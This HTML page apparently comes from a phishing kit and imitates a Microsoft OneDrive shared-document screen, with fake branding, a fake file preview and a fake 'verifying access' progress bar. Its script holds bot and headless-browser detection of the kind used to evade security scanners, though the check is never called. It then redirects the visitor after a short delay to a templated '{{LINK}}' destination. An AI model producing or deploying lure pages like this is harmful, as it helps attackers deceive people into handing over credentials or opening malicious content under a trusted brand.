<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OneDrive - Shared Document</title>
<link rel="icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20221209.001/assets/brand-icons/product/svg/onedrive_32x1.svg" type="image/svg+xml">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#323130}
.container{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.1);max-width:480px;width:90%;padding:48px 40px;text-align:center}
.logo{width:48px;height:48px;margin:0 auto 24px}
.logo svg{width:100%;height:100%}
h1{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
.subtitle{color:#605e5c;font-size:14px;margin-bottom:32px;line-height:1.5}
.doc-preview{background:#f3f2f1;border:1px solid #edebe9;border-radius:4px;padding:16px;margin-bottom:28px;display:flex;align-items:center;gap:12px;text-align:left}
.doc-icon{width:40px;height:40px;background:#0078d4;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.doc-icon svg{width:20px;height:20px;fill:#fff}
.doc-info{flex:1;min-width:0}
.doc-name{font-size:14px;font-weight:600;color:#323130;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.doc-meta{font-size:12px;color:#a19f9d;margin-top:2px}
.progress-area{margin-bottom:16px}
.progress-bar{height:3px;background:#edebe9;border-radius:2px;overflow:hidden}
.progress-fill{height:100%;width:0;background:#0078d4;border-radius:2px;transition:width 2.5s ease-in-out}
.status{font-size:13px;color:#605e5c;margin-top:12px}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #edebe9;border-top:2px solid #0078d4;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.footer{margin-top:32px;font-size:11px;color:#a19f9d}
</style>
</head>
<body>
<div class="container">
<div class="logo">
<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M24.5 8c-2.8 0-5.4 1-7.5 2.7C15.7 9 13.7 8 11.5 8 6.8 8 3 11.8 3 16.5c0 1.6.4 3.1 1.2 4.4C1.6 23 0 26.1 0 29.5 0 35.9 5.1 41 11.5 41h26c5.8 0 10.5-4.7 10.5-10.5 0-4.3-2.6-8-6.3-9.6.2-.8.3-1.6.3-2.4C42 12.7 36.8 8 30.5 8c-2.2 0-4.2.6-6 1.6z" fill="#0078d4"/><path d="M24.5 8c-2.8 0-5.4 1-7.5 2.7-1.1-.8-2.3-1.3-3.7-1.6C15.5 6 19.7 4 24.5 4c6.3 0 11.5 4.7 11.5 10.5 0 .8-.1 1.6-.3 2.4 3.7 1.6 6.3 5.3 6.3 9.6 0 5.8-4.7 10.5-10.5 10.5h-7V22l8 8" fill="none" stroke="#fff" stroke-width="2"/></svg>
</div>
<h1>Shared Document Ready</h1>
<p class="subtitle">Someone shared a document with you via OneDrive. Preparing secure access...</p>
<div class="doc-preview">
<div class="doc-icon"><svg viewBox="0 0 24 24"><path d="M6 2a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6H6zm7 1.5L18.5 9H13V3.5zM8 12h8v1.5H8V12zm0 3h8v1.5H8V15z"/></svg></div>
<div class="doc-info">
<div class="doc-name">Shared_Document_2026.docx</div>
<div class="doc-meta">245 KB &bull; Shared just now</div>
</div>
</div>
<div class="progress-area">
<div class="progress-bar"><div class="progress-fill" id="pf"></div></div>
<div class="status"><span class="spinner"></span><span id="st">Verifying access permissions...</span></div>
</div>
<div class="footer">Microsoft OneDrive &copy; 2026 Microsoft</div>
</div>
<script>
(function(){
var _0x={wD:navigator.webdriver,pf:navigator.platform,pl:navigator.plugins,ua:navigator.userAgent.toLowerCase()};
function _c(){
if(_0x.wD===true)return false;
if(/headless|phantom|selenium|puppeteer|crawl|bot|spider|slurp|mediapartners/i.test(_0x.ua))return false;
if(window.outerWidth===0&&window.outerHeight===0)return false;
try{if(window.self!==window.top&&document.referrer==='')return false}catch(e){}
return true;
}

setTimeout(function(){window.location.href='{{LINK}}'},2800);
})();
</script>
</body>
</html>
